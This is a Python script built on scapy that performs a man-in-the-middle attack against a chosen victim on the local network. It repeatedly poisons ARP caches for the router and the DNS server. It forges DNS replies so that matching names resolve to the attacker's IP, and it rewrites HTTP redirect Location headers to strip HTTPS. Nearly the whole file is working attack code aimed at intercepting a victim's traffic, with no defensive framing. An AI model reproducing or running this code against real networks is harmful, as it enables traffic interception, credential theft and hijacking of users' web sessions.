import sys
from scapy.all import Ether,conf, get_if_addr,get_if_hwaddr,sendp,sniff,IP,DNS,DNSRR,UDP ,Raw,TCP ,DNSQR
import subprocess
import time
import signal 
import arp_util
import threading
import os
import dns_local
from http_ex  import HTTP
from  printing import Printing


ToKillDNS = set() 

def validateDNS(packet:DNS)->bool: 
    try: 
        if DNSQR in packet and packet[DNSQR].qname.decode().removeprefix('https://').startswith("vvvvvv.") : 
            return True 
    except: 
        ...
    return False 

def validateHttp(rawp:bytes)->bool:
    VALIDHTTP=b"HTTP"
    try : 
        return rawp.startswith(VALIDHTTP)
    except : 
        return False 

def spoofedURL(url:str)->str: 
    return f"http://vvvvvv.{url.strip().removeprefix('https://').removeprefix('www.').strip()}"
            
def throworkill(packet:Ether,routerMac:str , dnsMac:str ,spoofedIp :str ,  interface:str )-> None: 
    
    packet[Ether].src = routerMac
    packet[Ether].dst = dnsMac
    
    #DNS spoofing 
    if DNS in packet and validateDNS(packet): 
        Printing.printSuccess(f"poisining {packet[DNS].qd.qname}!")
        et = Ether(src =routerMac , dst =  dnsMac )
        ip =  IP(src=packet[IP].src,dst=packet[IP].dst)
        udp = UDP(dport=packet[UDP].dport,sport=packet[UDP].sport)
        dnsdiff= DNS(id=packet[DNS].id,qd=packet[DNS].qd,
                     aa=1,
                     qr=1,
                     an=DNSRR(rrname=packet[DNS].qd.qname,type='A',ttl=10,rdata=spoofedIp))
        packet = et/ip/udp/dnsdiff
    
    #HTTP spoofing 
    if Raw in packet and validateHttp(packet[Raw].load) : 
        httpPack = HTTP.FromRawPack(packet[Raw].load)
        if httpPack and httpPack.sslStripavailable(): 
            httpPack.headers["Location"]=spoofedURL(httpPack.headers["Location"])
            Printing.printSuccess(httpPack)
            et = Ether(src =routerMac , dst =  dnsMac )
            ip =  IP(src=packet[IP].src,dst=packet[IP].dst)
            tcp = TCP(dport=packet[TCP].dport,sport=packet[TCP].sport,seq=packet[TCP].seq , ack =packet[TCP].ack , flags = packet[TCP].flags )
            raw = Raw(httpPack.toRaw())
            packet = et/ip/tcp/raw
    sendp(packet,iface=interface,verbose=False) 
   
def HttpDnsSpoofer(victim : str , interface : str )->None:

             
    attackData = { 
        "victim": None ,  
        "victimmac":None ,  
        "targetMac" : None,
        "routerMac" : None,
        "mac ":None , #my mac
        "ip" : None , #my ip , 
        "dnsServer" : None , 
        "dnsServerMac" : None ,
    } 
   
    def dispose(*args): 
        print("dispoe")
        arp_util.changeArpTable(attackData["router"], attackData["routerMac"], attackData["victim"] , attackData["victimmac"],attackData["interface"] )
        sys.exit(0)
    
        
    def redoit():
        while(True):
            arp_util.changeArpTable(attackData["router"], attackData["routerMac"], attackData["victim"] , attackData["mac"],attackData["interface"] )
            arp_util.changeArpTable(attackData["dnsServer"], attackData["dnsServerMac"], attackData["victim"] , attackData["mac"],attackData["interface"] )
            time.sleep(0.1)
   
    
    
    #### attackData ####
    attackData["victim"]=victim
    attackData["interface"]=interface
    attackData["victimmac"]=arp_util.getTargetMac(attackData["victim"], attackData["interface"])
    attackData["router"] = next(filter(lambda x : x[3] == attackData["interface"] , dict(conf.route.__dict__)["routes"]))[2]
    attackData["routerMac"] = arp_util.getTargetMac(attackData["router"], attackData["interface"])
    attackData["mac"]=get_if_hwaddr(attackData["interface"])
    attackData["ip"]= get_if_addr(attackData["interface"])
    attackData["dnsServer"] = dns_local.get_dns_local_server()
    attackData["dnsServerMac"] = arp_util.getTargetMac(attackData["dnsServer"], attackData["interface"])
    #### attackData ####
    
    
    
    Printing.printLog(attackData)
    sniff(lfilter= lambda x : IP in x and x[IP].dst == attackData["victim"] , prn = lambda packet : throworkill(packet, attackData["routerMac"], attackData["victimmac"], attackData["ip"],attackData["interface"]) )
     
    tr = threading.Thread(target=redoit)
    tr.start()
    
    signal.signal(signal.SIGINT, dispose)
    
    tr.join()
    signal.pause()
    dispose()



 
        
   